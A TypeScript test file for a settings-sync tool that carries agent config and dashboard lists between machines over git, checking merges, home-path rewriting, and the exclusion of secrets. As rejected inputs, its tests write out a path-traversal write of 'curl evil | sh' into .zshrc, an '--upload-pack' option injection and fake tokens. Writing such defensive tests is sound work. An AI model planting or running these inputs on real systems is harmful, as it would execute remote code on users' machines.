import { afterEach, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { runChecked } from "./proc";
import { CalendarsFile } from "./server/calendars-file";
import type { ListKind } from "./server/list-registry";
import { PreferencesFile } from "./server/preferences-file";
import { ProcessSettingsFile } from "./server/process-settings-file";
import { UserNotesFile } from "./server/user-notes-file";
import { UserTodosFile } from "./server/user-todos-file";
import { WorkspacesFile } from "./server/workspaces-file";
import { applyLocal, canonicalJson, cloneUrl, localPath, mergeFile, mergeJson, planSync, portablePath, portableText, readLocal, SettingsSync, type SyncStore, sourceControlStore, syncStores } from "./settings-sync";
import { missingGithubRepo, neverSynced, parseSyncSettings, SYNC_ITEMS, type SyncStoreId } from "./shared/settings-sync";
import { SourceControl } from "./source-control";
import type { UserNoteChange } from "./user-notes-shared";
import { addTodo } from "./user-todos";

const dirs: string[] = [];
afterEach(() => {
	for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

const scratch = (): string => {
	const dir = realpathSync(mkdtempSync(join(tmpdir(), "omp-agents-sync-")));
	dirs.push(dir);
	return dir;
};

const put = (path: string, text: string | Uint8Array): void => {
	mkdirSync(dirname(path), { recursive: true });
	writeFileSync(path, text);
};

const text = (value: string) => ({ text: value, executable: false });

/** Stores that read `values`, `{}` for the rest, and take whatever sync writes. */
const fixedStores = (values: Partial<Record<SyncStoreId, unknown>> = {}): Record<SyncStoreId, SyncStore> => {
	const store = (id: SyncStoreId): SyncStore => ({ read: () => values[id] ?? {}, parse: value => ({ ok: value }), write: () => {} });
	return { "source-control": store("source-control"), notes: store("notes"), todos: store("todos"), preferences: store("preferences"), workspaces: store("workspaces"), calendars: store("calendars") };
};

describe("what syncs", () => {
	test("never syncs credentials, databases, sessions, locks, or the dashboard's machine files, and every item's own path is allowed", () => {
		for (const path of ["omp/agent.db", "omp/agent.db-wal", "omp/mcp.json", "omp/secrets.yml", "omp/secret-placeholder.key", "omp/sessions/a/b.jsonl", "omp/config.yml.lock", "omp/skills/x/.env", "omp/skills/x/id_ed25519", "omp/skills/x/node_modules/y.js", "dashboard/token", "dashboard/interrupted.json", "dashboard/merges.json", "dashboard/server.lock"]) {
			expect([path, neverSynced(path)]).toEqual([path, true]);
		}
		for (const path of ["omp/config.yml", "omp/AGENTS.md", "omp/skills/x/SKILL.md", "dashboard/source-control.json"]) expect([path, neverSynced(path)]).toEqual([path, false]);
		expect(SYNC_ITEMS.filter(item => neverSynced(item.path))).toEqual([]);
	});

	test("reads only the portable files of omp's directory and the dashboard's lists, and leaves links, binaries, and anything holding a token on this machine", async () => {
		const omp = scratch();
		const elsewhere = scratch();
		put(join(omp, "config.yml"), "theme: dark\n");
		put(join(omp, "AGENTS.md"), "Be brief.\n");
		put(join(omp, "agent.db"), "SQLite format 3");
		put(join(omp, "mcp.json"), '{"mcpServers":{}}');
		put(join(omp, "secrets.yml"), "token: x\n");
		put(join(omp, "config.yml.lock"), "");
		put(join(omp, "sessions", "a.jsonl"), "{}\n");
		put(join(omp, "skills", "alpha", "SKILL.md"), "# Alpha\n");
		put(join(omp, "skills", "alpha", "run.sh"), "#!/bin/sh\n");
		chmodSync(join(omp, "skills", "alpha", "run.sh"), 0o755);
		put(join(omp, "skills", "alpha", ".env"), "KEY=1\n");
		put(join(omp, "skills", "alpha", "logo.png"), new Uint8Array([0x89, 0x50, 0x00, 0x47]));
		put(join(omp, "skills", "beta", "SKILL.md"), `Use ghp_${"a".repeat(36)} to call GitHub.\n`);
		put(join(elsewhere, "SKILL.md"), "# Gamma\n");
		symlinkSync(elsewhere, join(omp, "skills", "gamma"));
		const settings = { on: false, repos: {}, cleanUp: true };
		const notes = { notes: { n: { title: "GitHub", body: `ghp_${"b".repeat(36)}` } } };
		const { files, skipped } = await readLocal(SYNC_ITEMS, { omp, home: "/Users/nobody", stores: fixedStores({ "source-control": settings, notes }) });
		expect(Object.fromEntries(files)).toEqual({
			"omp/config.yml": text("theme: dark\n"),
			"omp/AGENTS.md": text("Be brief.\n"),
			"omp/skills/alpha/SKILL.md": text("# Alpha\n"),
			"omp/skills/alpha/run.sh": { text: "#!/bin/sh\n", executable: true },
			"dashboard/source-control.json": text('{\n\t"cleanUp": true,\n\t"on": false,\n\t"repos": {}\n}\n'),
			"dashboard/todos.json": text("{}\n"),
			"dashboard/preferences.json": text("{}\n"),
			"dashboard/workspaces.json": text("{}\n"),
			"dashboard/calendars.json": text("{}\n"),
		});
		expect(skipped.sort((a, b) => a.path.localeCompare(b.path))).toEqual([
			{ path: "dashboard/notes.json", reason: "credential" },
			{ path: "omp/skills/alpha/logo.png", reason: "binary" },
			{ path: "omp/skills/beta/SKILL.md", reason: "credential" },
			{ path: "omp/skills/gamma", reason: "link" },
		]);
	});
});

describe("a remote's paths", () => {
	const stores = fixedStores();

	test("a path that climbs out of its item is left on the remote and never planned for this machine", () => {
		const remote = new Map(["omp/skills/../../../.zshrc", "omp/skills//x", "omp/skills/./x", "omp/skills/a/SKILL.md"].map(path => [path, text("x\n")]));
		const plan = planSync({ items: SYNC_ITEMS, base: new Map(), local: new Map(), remote, skipped: [], choices: {} });
		expect(plan.conflicts === null && [...plan.toLocal.keys()]).toEqual(["omp/skills/a/SKILL.md"]);
	});

	test("a write that would land outside its item's directory is refused before it touches the disk", async () => {
		const home = scratch();
		const omp = join(home, ".omp", "agent");
		mkdirSync(join(omp, "skills"), { recursive: true });
		await expect(applyLocal(SYNC_ITEMS, new Map([["omp/skills/../../../.zshrc", text("curl evil | sh\n")]]), { omp, home, stores }, new Map())).rejects.toThrow("outside omp/skills");
		expect(existsSync(join(home, ".zshrc"))).toBe(false);
	});
});

describe("mergeFile", () => {
	const base = text("base\n");
	test("takes the side that changed, keeps a change both made alike, and deletes what one side deleted", () => {
		expect(mergeFile(base, text("mine\n"), base, false)).toEqual({ ok: text("mine\n") });
		expect(mergeFile(base, base, text("theirs\n"), false)).toEqual({ ok: text("theirs\n") });
		expect(mergeFile(base, text("both\n"), text("both\n"), false)).toEqual({ ok: text("both\n") });
		expect(mergeFile(base, base, null, false)).toEqual({ ok: null });
		expect(mergeFile(null, null, text("new\n"), false)).toEqual({ ok: text("new\n") });
	});

	test("conflicts on two different changes, or on two different files with no sync before, unless a side is chosen", () => {
		expect(mergeFile(base, text("mine\n"), text("theirs\n"), false)).toEqual({ conflict: true });
		expect(mergeFile(base, null, text("theirs\n"), false)).toEqual({ conflict: true });
		expect(mergeFile(null, text("mine\n"), text("theirs\n"), false)).toEqual({ conflict: true });
		expect(mergeFile(base, text("mine\n"), text("theirs\n"), false, "local")).toEqual({ ok: text("mine\n") });
		expect(mergeFile(base, text("mine\n"), text("theirs\n"), false, "remote")).toEqual({ ok: text("theirs\n") });
	});

	test("merges JSON key by key when both sides changed different keys, and conflicts on one key changed two ways", () => {
		const json = (value: unknown) => text(canonicalJson(value));
		const from = json({ on: false, repos: { "~/a": true }, cleanUp: true });
		expect(mergeFile(from, json({ on: true, repos: { "~/a": true }, cleanUp: true }), json({ on: false, repos: { "~/a": true, "~/b": false }, cleanUp: true }), true)).toEqual({
			ok: json({ on: true, repos: { "~/a": true, "~/b": false }, cleanUp: true }),
		});
		expect(mergeFile(from, json({ on: true, repos: {}, cleanUp: true }), json({ on: false, repos: { "~/a": true }, cleanUp: false }), true)).toEqual({ ok: json({ on: true, repos: {}, cleanUp: false }) });
		expect(mergeFile(from, json({ on: true, repos: { "~/a": false }, cleanUp: true }), json({ on: false, repos: {}, cleanUp: false }), true)).toEqual({ conflict: true });
		expect(mergeFile(from, json({ on: true, repos: { "~/a": false }, cleanUp: true }), json({ on: false, repos: {}, cleanUp: false }), true, "remote")).toEqual({
			ok: json({ on: true, repos: {}, cleanUp: false }),
		});
	});
});

describe("mergeJson", () => {
	const [a, b, c, d] = ["a", "b", "c", "d"].map(id => ({ id, text: id.toUpperCase() }));

	test("keeps what each side added, merges an entry both changed, and drops what one side deleted and the other left alone", () => {
		expect(mergeJson([a], [a, b], [a, c], undefined)).toEqual({ ok: [a, b, c] });
		expect(mergeJson([a, b], [a], [a, b, c], undefined)).toEqual({ ok: [a, c] });
		expect(mergeJson(["x"], ["x", "y"], [], undefined)).toEqual({ ok: ["y"] });
		expect(mergeJson([a], [{ ...a, text: "A2" }], [{ ...a, done: true }], undefined)).toEqual({ ok: [{ id: "a", text: "A2", done: true }] });
	});

	test("conflicts on an entry one side deleted and the other changed, unless a side is chosen", () => {
		const edited = { ...a, text: "A2" };
		expect(mergeJson([a, b], [b], [edited, b], undefined)).toBeNull();
		expect(mergeJson([a, b], [b], [edited, b], "local")).toEqual({ ok: [b] });
		expect(mergeJson([a, b], [b], [edited, b], "remote")).toEqual({ ok: [edited, b] });
	});

	test("follows the side that reordered, with the other side's addition after the entry before it there, and conflicts on two orders", () => {
		expect(mergeJson([a, b, c], [c, a, b], [a, d, b, c], undefined)).toEqual({ ok: [c, a, d, b] });
		expect(mergeJson([a, b, c], [b, a, c], [a, c, b], undefined)).toBeNull();
		expect(mergeJson([a, b, c], [b, a, c], [a, c, b], "remote")).toEqual({ ok: [a, c, b] });
	});

	test("keeps a list as one value when an entry has no identity or shares one", () => {
		expect(mergeJson([{ url: "x" }], [{ url: "x" }, { url: "y" }], [{ url: "x" }, { url: "z" }], undefined)).toBeNull();
		expect(mergeJson(["x"], ["x", "x"], ["x", "y"], undefined)).toBeNull();
	});
});

describe("home paths", () => {
	test("names the home directory as ~ in text and in paths, and not a sibling directory that starts the same", () => {
		expect(portableText("notes: /Users/ann/notes, root: /Users/ann\nother: /Users/anna/x /data/Users/ann/y", "/Users/ann")).toBe("notes: ~/notes, root: ~\nother: /Users/anna/x /data/Users/ann/y");
		expect(portablePath("/Users/ann/code/app", "/Users/ann")).toBe("~/code/app");
		expect(portablePath("/Users/anna/code/app", "/Users/ann")).toBe("/Users/anna/code/app");
		expect(portablePath("/opt/app", "/Users/ann")).toBe("/opt/app");
		expect(localPath("~/code/app", "/home/bob")).toBe("/home/bob/code/app");
		expect(localPath("/opt/app", "/home/bob")).toBe("/opt/app");
	});

	test("carries each repository's pull choice between machines under each one's home", () => {
		const dir = scratch();
		const ann = new SourceControl(join(dir, "ann.json"));
		ann.apply({ op: "repo", repo: "/Users/ann/code/app", on: true });
		ann.apply({ op: "repo", repo: "/opt/shared", on: false });
		const bob = new SourceControl(join(dir, "bob.json"));
		const portable = sourceControlStore(ann, "/Users/ann").read();
		expect(portable).toEqual({ on: false, repos: { "~/code/app": true, "/opt/shared": false }, cleanUp: true });
		sourceControlStore(bob, "/home/bob").write(portable);
		expect(bob.settings).toEqual({ on: false, repos: { "/home/bob/code/app": true, "/opt/shared": false }, cleanUp: true });
	});
});

describe("parseSyncSettings", () => {
	test("takes an address and a branch, and refuses a password in the address or an option in disguise", () => {
		expect(parseSyncSettings({ remote: " git@github.com:ann/omp.git ", branch: "main", excluded: ["source-control"] })).toEqual({ ok: { remote: "git@github.com:ann/omp.git", branch: "main", excluded: ["source-control"] } });
		expect(parseSyncSettings({ remote: "https://ann:hunter2@example.com/omp.git", branch: "main", excluded: [] })).toEqual({ error: "Leave the password out of the address; sync uses this machine's git credentials" });
		expect(parseSyncSettings({ remote: "--upload-pack=touch", branch: "main", excluded: [] })).toEqual({ error: "That is not a Git remote address" });
		expect(parseSyncSettings({ remote: "/tmp/r.git", branch: "../x", excluded: [] })).toEqual({ error: "That is not a branch name" });
	});
});

/** One machine: its home, omp's directory, the dashboard's files, the lists a sync rewrote, and its settings sync on `remote`. */
function machine(root: string, remote: string) {
	const home = join(root, "home");
	const omp = join(home, ".omp", "agent");
	mkdirSync(omp, { recursive: true });
	const config = (name: string): string => join(root, "config", name);
	mkdirSync(config(""), { recursive: true });
	const files = {
		sourceControl: new SourceControl(config("source-control.json")),
		notes: new UserNotesFile(config("notes.json")),
		todos: new UserTodosFile(config("todos.json")),
		preferences: new PreferencesFile(config("preferences.json")),
		processes: new ProcessSettingsFile(config("processes.json")),
		workspaces: new WorkspacesFile(config("workspaces.json")),
		calendars: new CalendarsFile(config("calendars.json")),
	};
	const changed = new Set<ListKind>();
	const places = { omp, home, stores: syncStores(files, home, list => changed.add(list)) };
	const sync = new SettingsSync(config("settings-sync.json"), join(root, "data", "settings-sync.git"), places);
	sync.configure({ remote, branch: "main", excluded: [] });
	return { home, omp, ...files, changed, places, sync };
}

/** Two machines on one new remote. */
async function pair() {
	const root = scratch();
	const remote = join(root, "remote.git");
	await runChecked(["git", "init", "--bare", "--quiet", remote]);
	return { remote, a: machine(join(root, "a"), remote), b: machine(join(root, "b"), remote) };
}

const addNote = (id: string): UserNoteChange => ({ op: "add", note: { id, title: id, body: "", todoId: null, addedBy: null, createdAt: "2026-01-01T00:00:00.000Z", updatedAt: "2026-01-01T00:00:00.000Z" } });

describe("a GitHub remote", () => {
	const repo = { url: "https://github.com/ann/omp-settings", sshUrl: "git@github.com:ann/omp-settings.git" };

	test("clones over SSH when gh's git_protocol says ssh, and over HTTPS otherwise, gh's default", () => {
		expect(cloneUrl(repo, "ssh\n")).toBe("git@github.com:ann/omp-settings.git");
		expect(cloneUrl(repo, "https\n")).toBe("https://github.com/ann/omp-settings.git");
		expect(cloneUrl(repo, "")).toBe("https://github.com/ann/omp-settings.git");
	});

	test("names the GitHub repository a failed sync could not find, and nothing for another failure or host", () => {
		expect(missingGithubRepo("git@github.com:ann/omp-settings.git", "ERROR: Repository not found.")).toBe("ann/omp-settings");
		expect(missingGithubRepo("https://github.com/ann/omp-settings", "remote: Repository not found.")).toBe("ann/omp-settings");
		expect(missingGithubRepo("ssh://git@github.com/ann/omp.settings.git/", "ERROR: Repository not found.")).toBe("ann/omp.settings");
		expect(missingGithubRepo("git@gitlab.com:ann/omp-settings.git", "ERROR: Repository not found.")).toBeNull();
		expect(missingGithubRepo("git@github.com:ann/omp-settings.git", "git@github.com: Permission denied (publickey).")).toBeNull();
	});
});

describe("SettingsSync", () => {
	test("carries a change from one machine to another, changes nothing on a second sync, and stops on a conflict until a side is chosen", async () => {
		const root = scratch();
		const remote = join(root, "remote.git");
		await runChecked(["git", "init", "--bare", "--quiet", remote]);
		const commits = async (): Promise<number> => Number((await runChecked(["git", "--git-dir", remote, "rev-list", "--count", "main"])).trim());
		const a = machine(join(root, "a"), remote);
		const b = machine(join(root, "b"), remote);
		const agentsMd = (side: { omp: string }) => join(side.omp, "AGENTS.md");

		put(agentsMd(a), `Notes live in ${a.home}/notes.\n`);
		put(join(a.omp, "skills", "alpha", "SKILL.md"), "# Alpha\n");
		a.sourceControl.apply({ op: "repo", repo: join(a.home, "code", "app"), on: true });
		const sent = ["calendars", "notes", "preferences", "source-control", "todos", "workspaces"].map(name => `dashboard/${name}.json`);
		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [...sent, "omp/AGENTS.md", "omp/skills/alpha/SKILL.md"] });
		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: ["dashboard/source-control.json", "omp/AGENTS.md", "omp/skills/alpha/SKILL.md"], sent: [] });
		expect(readFileSync(agentsMd(b), "utf8")).toBe("Notes live in ~/notes.\n");
		expect(readFileSync(join(b.omp, "skills", "alpha", "SKILL.md"), "utf8")).toBe("# Alpha\n");
		expect(b.sourceControl.settings.repos).toEqual({ [join(b.home, "code", "app")]: true });

		expect(await commits()).toBe(1);
		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [] });
		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [] });
		expect(await commits()).toBe(1);
		expect(readFileSync(agentsMd(a), "utf8")).toBe(`Notes live in ${a.home}/notes.\n`);

		rmSync(join(a.omp, "skills", "alpha"), { recursive: true });
		put(agentsMd(a), "From A.\n");
		await a.sync.sync();
		put(agentsMd(b), "From B.\n");
		const conflicted = (await b.sync.sync()).last;
		expect(conflicted).toMatchObject({ kind: "conflict", conflicts: [{ path: "omp/AGENTS.md", item: "omp-agents-md", local: "From B.\n", remote: "From A.\n" }] });
		expect(readFileSync(agentsMd(b), "utf8")).toBe("From B.\n");
		expect(existsSync(join(b.omp, "skills", "alpha", "SKILL.md"))).toBe(true);
		expect(await commits()).toBe(2);

		expect((await b.sync.sync({ "omp/AGENTS.md": "remote" })).last).toMatchObject({ kind: "synced", received: ["omp/AGENTS.md", "omp/skills/alpha/SKILL.md"], sent: [] });
		expect(readFileSync(agentsMd(b), "utf8")).toBe("From A.\n");
		expect(existsSync(join(b.omp, "skills", "alpha"))).toBe(false);
		expect(existsSync(join(b.omp, "skills"))).toBe(true);
	});

	test("leaves an item the user turned off as it is on both sides", async () => {
		const { remote, a, b } = await pair();
		put(join(a.omp, "AGENTS.md"), "From A.\n");
		await a.sync.sync();
		put(join(b.omp, "AGENTS.md"), "From B.\n");
		b.sync.configure({ remote, branch: "main", excluded: ["omp-agents-md"] });
		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [] });
		expect(readFileSync(join(b.omp, "AGENTS.md"), "utf8")).toBe("From B.\n");
		expect(await runChecked(["git", "--git-dir", remote, "show", "main:omp/AGENTS.md"])).toBe("From A.\n");
	});

	test("keeps the todos and notes two machines each added, carries the preferences and workspaces, and settles both on one list", async () => {
		const { remote, a, b } = await pair();
		const [notes, preferences, todos, workspaces] = ["notes", "preferences", "todos", "workspaces"].map(name => `dashboard/${name}.json`);
		await a.sync.sync();
		await b.sync.sync();
		a.todos.apply(addTodo({ id: "from-a", text: "From A" }));
		a.notes.apply(addNote("note-a"));
		a.preferences.apply({ op: "set", key: "omp-agents.theme", value: "dark" });
		a.workspaces.apply({ op: "add", cwd: join(a.home, "code", "app") });
		b.todos.apply(addTodo({ id: "from-b", text: "From B", status: "done" }));
		b.notes.apply(addNote("note-b"));

		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [notes, preferences, todos, workspaces] });
		expect(await runChecked(["git", "--git-dir", remote, "show", `main:${workspaces}`])).toContain('"~/code/app"');
		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: [notes, preferences, todos, workspaces], sent: [notes, todos] });
		expect((await a.sync.sync()).last).toMatchObject({ kind: "synced", received: [notes, todos], sent: [] });
		expect((await b.sync.sync()).last).toMatchObject({ kind: "synced", received: [], sent: [] });

		for (const side of [a, b]) {
			expect(side.todos.value.todos.map(todo => todo.id)).toEqual(["from-a", "from-b"]);
			expect(side.notes.value.notes.map(note => note.id).sort()).toEqual(["note-a", "note-b"]);
		}
		expect(b.preferences.value).toEqual({ "omp-agents.theme": "dark" });
		expect(b.workspaces.value.added).toEqual([join(b.home, "code", "app")]);
		expect([...b.changed].sort()).toEqual(["preferences", "user-notes", "user-todos", "workspaces"]);
		expect([...a.changed].sort()).toEqual(["user-notes", "user-todos"]);
	});

	test("stops on a todo one machine removed and the other edited, until a side is chosen", async () => {
		const { a, b } = await pair();
		a.todos.apply(addTodo({ id: "shared", text: "Ship it" }));
		await a.sync.sync();
		await b.sync.sync();
		a.todos.apply({ op: "remove", id: "shared" });
		await a.sync.sync();
		b.todos.apply({ op: "edit", id: "shared", text: "Ship it today" });

		expect((await b.sync.sync()).last).toMatchObject({ kind: "conflict", conflicts: [{ path: "dashboard/todos.json", item: "todos" }] });
		expect(b.todos.value.todos.map(todo => todo.text)).toEqual(["Ship it today"]);
		expect((await b.sync.sync({ "dashboard/todos.json": "local" })).last).toMatchObject({ kind: "synced", received: [], sent: ["dashboard/todos.json"] });
		await a.sync.sync();
		expect(a.todos.value.todos.map(todo => todo.text)).toEqual(["Ship it today"]);
	});

	test("keeps a todo added while a sync ran beside the one the sync brings", async () => {
		const here = machine(scratch(), "unused");
		const items = SYNC_ITEMS.filter(item => item.id === "todos");
		const before = await readLocal(items, here.places);
		here.todos.apply(addTodo({ id: "here", text: "Added here" }));
		const there = new UserTodosFile(join(scratch(), "todos.json"));
		there.apply(addTodo({ id: "there", text: "From the remote" }));

		await applyLocal(items, new Map([["dashboard/todos.json", text(canonicalJson(there.json()))]]), here.places, before.files);
		expect(here.todos.value.todos.map(todo => todo.id).sort()).toEqual(["here", "there"]);
		expect([...here.changed]).toEqual(["user-todos"]);
	});

	test("reports a remote it cannot reach as a failed sync", async () => {
		const root = scratch();
		const a = machine(join(root, "a"), join(root, "missing.git"));
		const last = (await a.sync.sync()).last;
		expect(last).toMatchObject({ kind: "failed", error: expect.stringContaining("does not appear to be a git repository") });
	});
});
